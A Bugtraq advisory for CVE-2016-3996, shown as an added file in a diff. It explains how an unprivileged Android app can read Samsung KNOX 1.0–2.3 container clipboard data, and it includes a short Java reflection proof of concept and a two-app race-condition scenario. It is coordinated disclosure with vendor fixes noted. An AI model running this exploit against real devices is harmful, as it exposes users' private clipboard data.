@@ -1,0 +1,176 @@
+
+Date: Sat, 16 Apr 2016 16:42:55 GMT
+From: urikanonov@...il.com
+To: bugtraq@...urityfocus.com
+Subject: [CVE-2016-3996]KNOX clipboard data disclosure KNOX 1.0 - KNOX 2.3
+ / Android
+
+Subject: [CVE-2016-3996]KNOX clipboard data disclosure KNOX 1.0 - KNOX 2.3 / Android
+
+Vulnerability Description
+=========================
+
+The vulnerability allows disclosure of Clipboard data of Samsung KNOX 1.0 and 2.3 containers.
+
+On KNOX-enabled devices there exists a proprietary service called clipboardEx which provides access to both the KNOX clipboard and the Android clipboard.
+The implementation is divided into two:
+1. Client: Each app that wants to use the clipboard uses the client class android.sec.clipboard.ClipboardExManager to connect to the service
+2. Server: This service runs in the system_server and is implemented by com.android.server.sec.InternalClipboardExService
+
+The following description is for KNOX 1.0.0, whereas the design in KNOX 2.3.0 is very similar and the differences will be noted at the end of this section.
+
+- Server
+The InternalClipboardExService has two important members:
+	* int mContainerID: The current container (mode) to which the clipboard is set. Zero is outside world and and anything except zero is KNOX. This member is initialized to zero.
+	* ClipboardDataMgr mDataList: A class managing the clipboard data. Located in framework2.
+
+Each API call that involves retrieving clipboard data uses the mDataList as the clipboard.
+An important method of the service is UpdateClipboardDB. Calling the method updates the mContainerID member and calls mDataList.UpdateClipboardDB(mContainerID), updating the clipboard to the new mode.
+The problem is that UpdateClipboardDB doesn't check who's the caller, i.e. Anyone that knows about the service can bind to it and call this method.
+
+The ClipboardDataMgr internally uses a android.sec.clipboard.data.file.FileManager to access clipboard data.
+The clipboard data is persistent and is stored under /data/clipboard (Android) and /data/clipboard/knox (for KNOX). 
+All files/dirs are owned by system. Dirs are world-listable but all files underneath are only system-accessible.
+Both the Android and KNOX clipboard data is stored unencrypted.
+
+- Client
+The client-side ClipboardExManager Provides the API to query the clipboardEx service.
+The code for ClipboardExManager doesn't come with the SDK but is located in framework2.jar/odex under /system/framework. 
+In the beginning of each method the ClipboardExManager obtains an instance of android.sec.clipboard.IClipboardService and uses it to perform the API call. 
+IClipboardService is the AIDL-generated binder wrapper for the clipboardEx API
+
+For example, getting the clipboard size: a call to ClipboardExManager.getDataListSize() would result in a call to IClipboardService.getDataSize().
+However, before each call to the IClipboardService method, ClipboardExManager calls checkCurrentMode() which among other things calls 
+IClipboardService.UpdateClipboardDB(0), setting the mContainerId of the server to 0, thus not allowing access to KNOX clipboard.
+
+It is noteworthy that ClipboardExManager doesn't provide a public API to UpdateClipboardDB.
+
+- The Attack
+In order for an attacker to get access to the KNOX clipboard all that is needed is for the service to have mContainerID != 0.
+The following defences are in an attacker's way:
+1. The ClipboardExManager is not in the SDK so its harder to use
+2. The IClipboardService.UpdateClipboardDB isn't exported from ClipboardExManager
+3. Each API call via ClipboardExManager performs checkCurrentMode() to reset the service to the appropriate container ID
+
+These protections can be easily bypassed:
+1. Extracting framework2.jar/odex from a device/ROM, studying it and using it
+2. Calling via reflection the private static method ClipboardExManager.getService to get an IClipboardService instance
+3. Using the APIs in IClipboardService directly instead of the wrapper methods in ClipboardExManager to avoid the calls to checkCurrentMode()
+
+Following is code exploiting the vulnerability:
+
+[---- Code Start ----]
+Class<ClipboardExManager> clipExMngClass = ClipboardExManager.class;
+Method getService = clipExMngClass.getDeclaredMethod("getService");
+getService.setAccessible(true);
+IClipboardService clipService = (IClipboardService)getService.invoke(null);
+clipboardService.UpdateClipboardDB(1); // Set knox mode
+�
+int size = clipService.getDataSize();
+System.out.println("size = " + size);
+
+ClipboardData data = clipService.GetClipboardData(1);
+System.out.println("data = " + data);
+
+ArrayList<String> clipedStrings = clipService.getClipedStrings(0, 100);
+System.out.println("clipedStrings.size() = " + clipedStrings.size());
+System.out.println("clipedStrings = " + clipedStrings);
+[---- Code End ----]
+
+On KNOX 2.3.0 the ``simple'' attack doesn't work due to security measures added to the clipboardEx service.
+However, the attack does work when launched from a newly created activity while KNOX is running in the background.
+During activity launch, for a short time, due to a race condition, the clipboardEx enters a vulnerable state during which a user application can obtain the contents of the KNOX clipboard.
+After this short period (approx. 10 seconds) the service refuses to disclose the KNOX keyboard contents as it manages to identify that it is being queried outside KNOX.
+The scenario in which the attack works:
+1. Two malicious applications are installed, A and B.
+2. Application A runs in the user environment in the background (e.g., using a service).
+3. KNOX is unlocked and brought to the foreground.
+4. Application A launches an activity in application B.
+5. Application B's activity obtains the KNOX clipboard in its onCreate method and calls finish() to close the GUI.
+
+Affected System Configurations
+==============================
+We have tested and verified the vulnerability on the following devices, however, we believe that ALL Samsung devices running KNOX 1.0.0 are vulnerable :
+1. Samsung Galaxy S3 
+- Model Number: GT-I9305 
+- Android Version: 4.3 
+- Kernel Version: 3.0.31-2051278 dpi@...L323 #1 
+- Build Number: JSS15J.I9305XXUEML8 
+- KNOX Version: 1.0.0 
+- State: Rooted, via flashing a custom recovery and kernel. KNOX warranty bit tripped, technically disabling KNOX. KNOX was re-enabled (fully functional) using root capabilities 
+
+2. Samsung Galaxy S4 
+- Model Number: GT-I9505 
+- Android Version: 4.3 
+- Kernel Version: 3.4.0-1869009 se.infra@...-106 #1 
+- Build Number: XXUEMJ5.CCOM 
+- KNOX Version: 1.0.0 
+- State: Rooted using SafeRoot. KNOX warranty bit not tripped, KNOX fully functional
+
+The KNOX 2.3 vulnerability was tested and verified on the following device, however, we believe that ALL Samsung devices running KNOX 2.3 are vulnerable:
+1. Samsung Note 3
+	- Model Number: SM-N9005
+	- Android Version: 5.0
+	- Kernel Version: 3.4.0-4540543 dpi@...D3013 #1
+	- Build Number LRX21V.N90055XXUGBOJ6
+	- KNOX: 
+		- Version: 2.3
+		- Standard SDK: 5.3.0
+		- Premium SDK: 2.3.0
+		- Customization SDK: 2.0.0
+		- Container: 2.3.0
+		- CEP: 2.0.1
+		- Enterprise Billing: 1.0.0
+		- SE for Android: 2.3.0
+		- SSO: 2.1.1
+		- TIMA: 3.0
+		- VPN: 2.2.0
+	- State: Not rooted
+
+Vulnerability Impact
+====================
+Prerequisites:
+- Code execution capabilities without any permissions (normal application)
+
+Attack:
+- KNOX 1.0: Run the exploit code from any application regardless of whether KNOX is in the foreground, background or even unlocked.
+- KNOX 2.3: Run attacker's code in the backround while KNOX is running in the foreground and launch an activity. Run the exploit code from the new activity.
+
+Implications:
+1. Any application without any permissions can obtain the contents of the KNOX clipboard.
+2. A root/system user can simply read the persistent clipboard data from /data/clipboard/knox without having to know the user's password (due to lack of encryption).
+
+Mitigation:
+- Users of KNOX 1.x should update to the latest version of KNOX 2.x.
+- Samsung are already distributing an update for KNOX 2.x patching this vulnerability.
+
+Vendor Contact
+==============
+We contacted Samsung on December 9th, 2015 and have had detailed email exchanges with the vendor regarding this vulnerability. 
+The highlights of the vendor's responses are: 
+
+- "Devices that are KNOX capable can be updated via the Maintenance Release process. KNOX 1.0 containers will automatically upgrade to the newer KNOX 2.x technology when the update is applied"
+- "Updating a KNOX 1.0 device to support KNOX 2.x would involve upgrading its Android version to at least Android 4.4"
+- "Following your instructions, we were able to reproduce and isolate the race condition responsible for the vulnerability you identified. We are working on a patch that eliminates the possibility of such race conditions allowing access to clipboard data, and will be deploying it to affected models as a security update"
+- "We started rolling out the remedy to the users since March of this year, and we are continuing to expand the release to more carriers."
+
+Vulnerability Discovery Method
+==============================
+We combined both static and dynamic analysis of KNOX 1.0.0 and KNOX 2.3 to find this vulnerability.
+The static analysis consisted of reverse-engineering KNOX 1.0.0 / 2.3 binaries taken from the aforementioned devices (due to KNOX being closed source).
+We extracted the .odex / .jar / .apk files of services and framework2 (the code of the system_server) and performed the following:
+- De-odexed them using the Universal Deodexer to obtain .dex files.
+- Converted the .dex files to .jar files (containing .class files) using dex2jar.
+- Disassembled the .jar files using jd-gui.
+- Analyzed the code of clipboardEx and client classes in framework2.
+
+Dynamic analysis was performed via a proof-of-concept based on our understanding of the clipboardEx client and server code. To compile the code we used the framework2.jar we obtained (by using dex2jar).
+
+Timeline
+========
+2015-12-09 Vendor notified
+2015-12-24 Vendor requested to hold off publication to give it time to prepare a patch
+2016-04-10 CVE number requested
+2016-04-11 CVE number assigned
+2016-04-11 Notification from vendor that patches are been distributed since march. Green light for publication.
+2016-04-16 Public disclosure
